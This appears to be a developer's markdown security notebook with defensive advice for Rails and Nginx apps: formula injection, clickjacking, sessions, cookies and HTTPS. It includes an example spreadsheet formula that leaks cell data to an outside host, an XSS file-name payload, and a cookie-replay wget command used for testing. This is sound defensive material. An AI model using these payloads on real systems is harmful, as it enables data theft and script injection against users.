tools 

* https://addons.mozilla.org/en-US/firefox/addon/httpfox/  inspect your post requests
* http://chrispederick.com/work/web-developer/  inspect cookies
* https://addons.mozilla.org/en-US/firefox/addon/export-cookies export cookies so you can use them with `wget` or `curl`


# Todo

* session cookie should expire on when user window is closed
  ( cookie attribute `Expires` should be `Session` not some date in future )

# Spreadsheet Formula Injection prevention

to protect replace `=` with `'=` 

This will display a black cell when first downloaded, with a security bar at the top of
excel document allowing users to enable editing if they trust the file

```
  def secure_xls_cell(cell_value)
    cell_value[0] = "'=" if cell_value[0] == '='
    cell_value
  end
```

example of attack

```
=HYPERLINK("http://contextis.co.uk?leak="&B1&B2, "Error: please click for further
information")
```

# antivirus

you can use cloud API solutions like [Scanii](https://scanii.com/) which can directly pull from S3, or implement solution where you would have antivirus VM that would pull list of files from app and then pull files from S3 and POST to your app resoult

**update**  I wrote:  https://github.com/equivalent/witch_doctor and https://github.com/equivalent/virus_scan_service to deal with this issue. Basically you set up separate windows VM with antivirus (like Casperski) and you just add Which Doctor gem as a gateway to your Rails app to schedule scans.

# concurent login

* ability to login with 2 devices at the same time 

now this may be a good thing for social network (mobile, tablet, computer at a same time) however in banking system dashboard that is a security risk. Make sure that only one session stays active.

for Devise gem in Rails there exist gem [devise security extension](https://github.com/phatworx/devise_security_extension) `:session_limitable` which tracks only one session an logs  out other one (Beware, this gem has no tests and promote "writing own integration tests on application side)


# exposing emails

if website is providing reset password feature, make sure that you show
same error message (and redirect to same page) nomather if the email
address is in your database or not. If you don't do that someone can
crate bot that would randomply hammer your application with email
addresses => exposing what email addresses are in DB

with Devise there is build in option

```ruby
# config/initializers/devise.rb

Devise.setup do |config|
  # ...
  config.paranoid = true
  # ...
end
```

# Clickjacking

...or iframe hijacking 


Cickjacking is an attack whereby a web application is
loaded in an IFRAME and transparently layered above an
innocent looking malicious page. This allows the attacker
to manipulate a user into performing actions
unbeknownst to them, such as stealing sensitive
information.

* http://www.contextis.co.uk/services/research/white-papers/clickjacking-black-hat-2010/
* https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options
* http://blog.kotowicz.net/2009/12/5-ways-to-prevent-clickjacking-on-your.html
* 
solution:


Server should send X-Frame-Option to client browser (most modern browsers sport it ).
When browser receive it web page will prevent beeing redered in Iframe

```
# nginx/sites-enabled/my-site.conf

location @unicorn {
  # ...
  add_header X-Frame-Options SAMEORIGIN;
  # ...
}
```

* note that the above will only work as an HTTP header; a META tag inside the page will not work


For older browsers use:

```
<script>
try {
if (top.location.hostname != self.location.hostname) throw 1;
} catch (e) {
top.location.href = self.location.href;
}
</script>
```

same cofeescript version: 

```
try
  throw 1 unless top.location.hostname is self.location.hostname
catch e
  top.location.href = self.location.href
```



you should place both on your server 

to test this create simple html file with iframe

```html
 <iframe src="http://my-site.com"></iframe>.
```


example is in `examples/clickjacking-iframe-example.html`

# forgoten password links should expire

Given user reset password now
When he tries to access it within 2 hours
Then resset password link should not be valid

# disable Concurrent Logins 

...in other words only one computer should be able to loggin for the same user. Logout the other computer.

Make sence for a bank dashboard, make no sence for social app (multiple devices at a same time)


# HTML "AutoComplete" should not be on Password Field Enabled

Many web browsers will prompt the user to remember
the username and password fields and offer to
automatically populate them in future.

Internet Explorer > 11, Mozilla Firefox > 30, Google Chrome > 34) no longer support HTML 'AutoComplete' on password field

solution: 

```
<input type=”text” name=”username” autocomplete=”off” />
<input type=”password” name=”password” autocomplete=”off” />
```

more info https://github.com/plataformatec/simple_form/issues/1191


# Session Remains Active After Logout

make sure you don't use cookie storage but some other better storage like cache store, database store, .. (explained in https://github.com/equivalent/scrapbook2/blob/master/security_notes.md#use-secure-cookies) 

# Authenticated Sessions should not be Transferable (or should they ?)

solution : "Incorporate Client Identifiers Within Session Data"

```
Consider implementing a mechanism to detect session
tokens being moved between client machines

* user agent changing (browser)
* ip chang
```

basically the premiss is to map session ids to IP adresses however there is lot of discussion on how this may be an overkill http://stackoverflow.com/questions/618301/binding-of-ip-address-with-session-id

(for devise you can use my for of [devise_security_extensions](https://github.com/equivalent/devise_security_extension)  branch: sessions_non_transferable, once again there are no tests yet as original gem promotes writing integration test)

especially: 

```
 if you want to use it as a general session ID, you might have problem to deal with users behind a certain proxy gateway, where all users will have the same IP address. although it could be used to prevent session theft (using techniques like cookie highjacking) for some level. but it should be considered that the cookie hijacker can also mimic the IP address of the victim. so checking the user session and also the IP address can be a good practice to have a higher security, but is not a bullet proof solution.
```

in other words if you building nuclear misle application it make sence but you are better of just whitelisting IP addresses that can access the site on a firewall

one good approach is just to map changes of IP addresses and Browser changes analized in backgorund job and then just force them to verify (like caling client manager number)


testing session-non transferable using firefox-export-cookies plugin
* 1 cleare all cookies in firefox
* 2 login to your site and export cookies using firefox export cookies plugin
* 3 `wget --load-cookies=/tmp/cookies.txt`

# secure XSS file name

try to upload located in  `scrapbook2/examples/filename_xss_example/XSSfile.<a onmouseover="alert(1)">a`



# Use Secure Cookies

Ensure that the secure flag is set on all cookies that are
used to maintain user state or have any security impact, and
that all sensitive data is transmitted over HTTPS.

meaning that `secure = secure` cookies wont be sent via http => only https => cannot hijack

Also ensure that any redirects from HTTPS pages redirect to
HTTPS and not HTTP pages.

**fix** 

eithere use `config.force_ssl` in production => everyting is https == and all cookies are secure

or if you need some pages to be "http" as well `force_ssl` only on controller and 
you need to manually pass allong `session_id` cookie another secure cookie with 
random string you'll compare on your side

you can do 

http://railscasts.com/episodes/356-dangers-of-session-hijacking

```ruby
# in config/environment.rb:
config.action_controller.session = {
    :key    => '_myapp_secure_session',
    :secret => 'super_very_long_key_more_than_30_chars',
    :expire_after => 3600 # 1 hour , or use session option to expiere when session expire
  }
```

...or for Devise gem:

https://github.com/plataformatec/devise/issues/3433

add gem https://github.com/mobalean/devise_ssl_session_verifiable

and if you're using devise rememberable use
```
# config/initializers/devise.rb
config.rememberable_options = { secure: true }

```

one more thing don't use cookies to store information just use them to session ID. Rather store cookies in diferrent way. There as the whole cookie store is bad, so better use some other type of storage(ActiveRecord db, Redis,
Memcache) [more info here](http://dev.housetrip.com/2014/01/14/session-store-and-security/)

```ruby
# config/initialzers/session_store.rb


## old no-no cookie way 
# MyProject::Application.config.session_store :cookie_store, key:
'_my_project_session'

Rails
  .application
  .config
  .session_store ActionDispatch::Session::CacheStore, :expire_after => 20.minutes
```

https://github.com/mperham/dalli#usage-with-rails-3x-and-4x


# Ensure that all requests use HTTPS use:

```ruby
  # confix/environmets/production.rb  && staging

  config.force_ssl = true
```

if you need it per controller level

```ruby
class ApplicationController < ActiveController::Base
   force_ssl if: :should_force_ssl?
   
   private
   
   def should_force_ssl?
     !Rails.env.in?(%w(development test))
   end
end

class NonHttpsContoller < ApplicationController
  def should_force_ssl?
    false
  end
end
```

You may have problems with NginX accepting the `force_ssl`. To solve this use 

```
  location @unicorn {
    # ...
    proxy_set_header X-Forwarded-Proto https;
    # ...
  }
```

* http://guides.rubyonrails.org/security.html#session-hijacking
* http://blog.tech-angels.com/post/840662150/ruby-on-rails-secure-cookies
* http://dev.housetrip.com/2014/01/14/session-store-and-security/


# Keep NginX updated

nginx should be updated regulary on server

```
sudo aptitude update
sudo aptitude safe-upgrade

# or if you prefere apt-get

apt-get update
apt-get upgrade      # equivalent of safe-upgrade in aptitude

# if doing kernels
apt-get dist-upgrade

# And Unattended Upgrades for automatic security updates
apt-get install unattended-upgrades #
dpkg-reconfigure unattended-upgrades # enable or disable easity
# configure in /etc/apt/apt.conf.d/50unattended-upgrades
```

source

* http://leftshift.io/upgrading-nginx-to-the-latest-version-on-ubuntu-servers
* my colegue M.H., thx Mike

# NginX disable POODLE

```
# /etc/nginx/nginx.conf

# ...
http {
  # ...
  # disable SSLv3 (POODLE)
  ssl_protocols TLSv1 TLSv1.1 TLSv1.2;
  # ...
}

```

# custom error pages

make sure that you render custom error pages for every error. You
don't have to create own page for every error but you must ensure that
you won't show NginX error page or Rails stack trace page


```
# /etc/nginx/sites-enabled/my-site.conf

  #...
  error_page 500 501 502 503 504 /500.html;
  error_page 400 /400.html;
  error_page 401 /401.html;
  error_page 403 /403.html;
  error_page 404 /404.html;
  error_page 405 /405.html;
  error_page 406 /406.html;

```
test `http://my-site.com/%%`  will render custom error page (400)


another isuse is `Rack::ShowExceptions` stack trace when you do
something like:

`curl -XINVALID https://my-application.com/clients -k`

this stack trace is by default turn off in production in rails 3.2.21 &
rails 4.x  but maybe you will need to turn it off for other enviroments.
I don't know the solution for that, for me the production was good
enough


source:

* http://stackoverflow.com/questions/13621915/nginx-error-pages-one-location-rule-to-fit-them-all

# NginX should not display version in error page

test it with opening browser at :

```
http://my-site.com/%%
```

```
# /etc/nginx/nginx.conf

# ...
http {
  # ...
  server_tokens off;
  # ...
}

```

This also disable the version number from next check headers in
`server` header. You should hide this header. You can find how to 
remove headers is in  this scapbook note file under "#Remove Headers"


source

* https://www.virendrachandak.com/techtalk/how-to-hide-nginx-version-number-in-headers-and-errors-pages/

# Remove Headers

If you compile your own NginX you can compile it with module
`HttpHeadersMoreModule`

and use:

```
more_clear_headers Server Date Status X-UA-Compatible Cache-Control
X-Request-Id X-Runtime X-Rack-Cache;

```

...or if you mange to install `sudo apt-get nginx-extras` working that
module should be included (never tried it )

If you use Nginx from Ubuntu apt-get repo

```
server {

  location @unicorn {

    # ...
    proxy_hide_header X-Powered-By;
    proxy_hide_header X-Runtime;
    # ...
  }
}
```

source:

i* https://stackoverflow.com/questions/10323331/remove-unnecessary-http-headers-in-my-rails-answers/27175020#27175020




source:

http://stackoverflow.com/questions/10323331/remove-unnecessary-http-headers-in-my-rails-answers


# Prevent Page Caching

The pages within authenticated areas of the application
are set to be cached in the browser. After a user has
logged off from the application, these pages are still
accessible within the browser, for example by using the
back button. Within a shared computing environment,
information within authenticated areas is exposed to this
attack.

Caching of pages within the authenticated areas should be
disabled. This can be achieved by returning the following
HTTP headers for all authenticated areas of the application:

```
Cache-Control: no-cache, no-store
Pragma: no-cache
Expires: -1
```

in rails 

* https://github.com/equivalent/no_cache_control

source: 

* http://www.contextis.com/
* http://stackoverflow.com/questions/10744169/rails-set-no-cache-method-cannot-disable-browser-caching-in-safari-and-opera
* http://apidock.com/rails/ActionController/ConditionalGet/expires_in
